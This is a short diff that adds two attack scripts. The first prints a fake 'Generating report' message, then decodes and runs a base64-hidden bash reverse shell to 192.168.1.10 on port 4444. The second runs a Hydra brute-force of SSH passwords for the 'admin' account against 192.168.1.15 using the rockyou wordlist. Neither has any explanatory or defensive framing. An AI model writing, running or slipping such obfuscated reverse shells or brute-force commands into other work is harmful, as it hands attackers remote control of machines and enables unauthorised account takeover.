@@ -1,1 +1,13 @@
+# reverse_payload.sh:
+
+#!/bin/bash  
+echo "[*] Generating report..."  
+sleep 2  
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvNDQ0NCAwPiYx' | base64 -d | bash  
+
+
+# hydra_bruteforce.sh:
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.1.15
+
 
